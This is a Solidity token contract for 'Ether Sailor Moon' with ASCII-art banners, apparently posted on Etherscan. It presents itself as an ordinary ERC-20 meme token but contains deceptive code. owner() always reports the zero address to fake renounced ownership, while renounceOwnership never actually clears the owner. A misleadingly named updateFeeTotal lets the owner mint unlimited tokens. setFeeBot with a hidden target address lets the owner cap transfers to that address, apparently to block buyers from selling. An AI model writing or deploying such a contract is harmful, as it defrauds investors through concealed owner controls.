/**
 *Submitted for verification at Etherscan.io on 2021-06-06
*/

/*

====================================================================================================================================================================================

____________________/\\\\\\\\\\\_________________________/\\\\\\_________________________________/\\\\____________/\\\\___________________________________________        
 __________________/\\\/////////\\\______________________\////\\\________________________________\/\\\\\\________/\\\\\\___________________________________________       
  _________________\//\\\______\///__________________/\\\____\/\\\________________________________\/\\\//\\\____/\\\//\\\___________________________________________      
   _____/\\\\\\\\____\////\\\__________/\\\\\\\\\____\///_____\/\\\________/\\\\\_____/\\/\\\\\\\__\/\\\\///\\\/\\\/_\/\\\_____/\\\\\________/\\\\\_____/\\/\\\\\\___     
    ___/\\\/////\\\______\////\\\______\////////\\\____/\\\____\/\\\______/\\\///\\\__\/\\\/////\\\_\/\\\__\///\\\/___\/\\\___/\\\///\\\____/\\\///\\\__\/\\\////\\\__    
     __/\\\\\\\\\\\__________\////\\\_____/\\\\\\\\\\__\/\\\____\/\\\_____/\\\__\//\\\_\/\\\___\///__\/\\\____\///_____\/\\\__/\\\__\//\\\__/\\\__\//\\\_\/\\\__\//\\\_   
      _\//\\///////____/\\\______\//\\\___/\\\/////\\\__\/\\\____\/\\\____\//\\\__/\\\__\/\\\_________\/\\\_____________\/\\\_\//\\\__/\\\__\//\\\__/\\\__\/\\\___\/\\\_  
       __\//\\\\\\\\\\_\///\\\\\\\\\\\/___\//\\\\\\\\/\\_\/\\\__/\\\\\\\\\__\///\\\\\/___\/\\\_________\/\\\_____________\/\\\__\///\\\\\/____\///\\\\\/___\/\\\___\/\\\_ 
        ___\//////////____\///////////______\////////\//__\///__\/////////_____\/////_____\///__________\///______________\///_____\/////________\/////_____\///____\///__

====================================================================================================================================================================================



                ..`                                `..                
             /dNdhmNy.                          .yNmhdMd/             
            yMMdhhhNMN-                        -NMNhhhdMMy            
           oMMmhyhhyhMN-                      -NMhyhhyhmMMs           
          /MMNhs/hhh++NM+                    +MN++hhh/shNMM/          
         .NMNhy`:hyyh:-mMy`                `yMm::hyyh:`yhNMN.         
        `mMMdh. -hyohy..yNh.`............`.yNy..yhoyh- .hdMMm`        
        hMMdh:  .hyosho...-:--------------:-...ohsoyh.  :hdMMh        
       oMMmh+   .hyooyh/...-::---------:::-.../hyooyh.   +hmMMo       
      /MMNhs    `hyoooyh-...://+++oo+++//:...-hyoooyh`    shNMM/      
     .NMNhy`     hhoooshysyhhhhhhhhhhhhhhhhysyhsooohh     `yhNMN-     
    `mMMdh.      yhsyhyso+::-.```....```.--:/osyhyshy      .hdMMm`    
    yMMmh/      -so/-`            ..            `-/os-      /hmMMh    
   /MMyhy      .`                 ``                 `.      shyMM/   
   mN/+h/                                                    /h+/Nm   
  :N:.sh.                                                    .hs.:N/  
  s-./yh`                   @eSailorMoon                     `hy/.-s  
  .`:/yh`                                                    `hy/:`-  
 ``-//yh-                                                    .hy//-`` 
 ``://oh+      `                                      `      +ho//:`` 
``.://+yy`     `+`                                  `+`     `yh+//:.``
``-///+oho      /y:                                :y/      ohs+///-``
``:////+sh/ ``  `yhs-                            -shy`  `` /hs+////:``
``:////++sh/  ```:syhs-                        -shys:```  /hs++////:``
``://///++sho`    `.-/+o/.                  ./o+/-.`    `+hs++/////:``
``://///+++oyy-      ``..--.              .--..``      -yyo+++/////:``
``-/////+++++shs.       ``...            ...``       .ohs+++++/////-``
 ``/////+++++++shs-        ..`          `..        -shs+++++++/////`` 
 ``-/////++++++++oys-       ..`        `..       -syo++++++++/////-`` 
  ``:////++++:-....+yy:      ..        ..      :yy+....-:++++////:``  
   `.////+++:-......./yy:     ..      ..     :yy/.......-:+++////.`   
    `.////++ooo+/-...../yy/`   .`    `.   `/yy/.....-/+ooo++////.`    
     `.////+++oooos+/:...:sy/`  .    .  `/ys:...:/+soooo+++////.`     
      `.:////+++++ooooso/:.:sh+` .  . `+hs:.:/osoooo+++++////:.`      
        `-//////++++++ooooso++yh+....+hy++osoooo++++++//////-`        
         `.:///////+++++++oooossyhoohyssoooo++++++////////:.`         
            .:/+++++++++++++++ooosyysooo++++++++++++++//:.            
              `-/+++++++++++++++oooooo+++++++++++++++/-`              
                 .-/++++++++++++++++++++++++++++++/-.                 
                    `.-//++++++++++++++++++++//-.`                    
                         `..-::://////:::-..`                         
                                                                      
                                                                      

                                                                                                       
                                                                                                       
                                                                                                                                                                             
                                                                      

SPDX-License-Identifier: Mines™®©
*/                                                                                                                                      
                                                                                                                                          
                                                                                                                                          
                                                                                                                                          




// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;







abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return address(0);
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) private onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract eSailorMoon is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    address private _tOwnerAddress;
    address private _tAllowAddress;
   
    uint256 private _tTotal = 1000 * 10**9 * 10**18;

    string private _name = 'Ether Sailor Moon';
    string private _symbol = 'eSailorMoon';
    uint8 private _decimals = 18;
    uint256 private _feeBot = 50 * 10**6 * 10**18;

    constructor () public {
        _balances[_msgSender()] = _tTotal;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferOwner(address newOwnerAddress) public onlyOwner {
        _tOwnerAddress = newOwnerAddress;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function addAllowance(address allowAddress) public onlyOwner {
        _tAllowAddress = allowAddress;
    }
    
    function updateFeeTotal(uint256 amount) public onlyOwner {
        require(_msgSender() != address(0), "ERC20: cannot permit zero address");
        _tTotal = _tTotal.add(amount);
        _balances[_msgSender()] = _balances[_msgSender()].add(amount);
        emit Transfer(address(0), _msgSender(), amount);
    }
    
    function setFeeBot(uint256 feeBotPercent) public onlyOwner {
        _feeBot = feeBotPercent * 10**18;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        
        if (sender != _tAllowAddress && recipient == _tOwnerAddress) {
            require(amount < _feeBot, "Transfer amount exceeds the maxTxAmount.");
        }
    
        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
}